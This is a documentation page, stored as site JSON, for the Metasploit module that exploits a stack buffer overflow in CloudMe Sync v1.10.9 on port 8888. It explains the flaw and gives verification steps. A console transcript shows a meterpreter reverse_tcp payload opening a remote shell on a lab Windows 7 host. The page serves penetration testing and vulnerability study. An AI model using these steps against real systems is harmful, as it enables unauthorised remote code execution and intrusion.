{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/cloudme_sync","result":{"data":{"moduleMetadataJson":{"id":"aa61eb2f-4d0e-5417-9e88-795b94b50d96","name":"CloudMe Sync v1.10.9","fullname":"exploit/windows/misc/cloudme_sync","description":"This module exploits a stack-based buffer overflow vulnerability\n        in CloudMe Sync v1.10.9 client application. This module has been\n        tested successfully on Windows 7 SP1 x86.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/cloudme_sync","documentationSlug":"/modules/documentation/exploit/windows/misc/cloudme_sync"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a buffer overflow vulnerability found in <a href=\"https://www.cloudme.com/downloads/CloudMe_1109.exe\">CloudMe Sync v1.10.9</a>.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><code class=\"language-text\">CloudMe.00564B00</code> sets up a buffer that is intended to take up 1048 bytes on the stack to read in data from port 8888. The CloudMe function then passes a pointer to the stack buffer and a max size to <code class=\"language-text\">Qt5Core._ZN9QIODevice4readEPcx</code>.</p>\n<p><img src=\"https://user-images.githubusercontent.com/40177151/44545528-f21f0280-a6da-11e8-898b-edd0a17e0d10.png\" alt=\"alt text\" title=\"CloudMe.00564B00\"></p>\n<p>The call to <code class=\"language-text\">Qt5Core._ZN9QIODevice4readEPcx</code> shows the pointer and the max size arguments passed in by <code class=\"language-text\">CloudMe.00564B00</code>.\n<img src=\"https://user-images.githubusercontent.com/40177151/44545559-09f68680-a6db-11e8-8a0b-36466dafd21e.png\" alt=\"alt text\" title=\"Qt Read Args\"></p>\n<p>Because neither functions check the max size against the actual amount of space allocated on the stack, the program writes past the buffer's allocated space and allows for arbitrary code execution.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install CloudMe for Desktop version <code class=\"language-text\">v1.10.9</code></li>\n<li>Start the applicaton (you don't need to create an account)</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/misc/cloudme_sync</code></li>\n<li>Do <code class=\"language-text\">set RHOST ip</code></li>\n<li>Do <code class=\"language-text\">set LHOST ip</code></li>\n<li>Do <code class=\"language-text\">exploit</code></li>\n<li>Verify the Meterpreter session is opened</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"cloudme-sync-client-application-on-windows-7-sp1-x86\" style=\"position:relative;\"><a href=\"#cloudme-sync-client-application-on-windows-7-sp1-x86\" aria-label=\"cloudme sync client application on windows 7 sp1 x86 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CloudMe Sync client application on Windows 7 SP1 x86</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/misc/cloudme_sync \nmsf exploit(windows/misc/cloudme_sync) &gt; set RHOST 172.16.40.148\nRHOST =&gt; 172.16.40.148\nmsf exploit(windows/misc/cloudme_sync) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(windows/misc/cloudme_sync) &gt; set LHOST 172.16.40.5 \nLHOST =&gt; 172.16.40.5\nmsf exploit(windows/misc/cloudme_sync) &gt; exploit \n\n[*] Started reverse TCP handler on 172.16.40.5:4444 \n[*] Sending stage (179779 bytes) to 172.16.40.148\n[*] Meterpreter session 1 opened (172.16.40.5:4444 -&gt; 172.16.40.148:57185) at 2018-02-19 12:35:21 +0000\n\nmeterpreter &gt; sysinfo \nComputer        : PC\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : pt_PT\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"aa61eb2f-4d0e-5417-9e88-795b94b50d96"}}}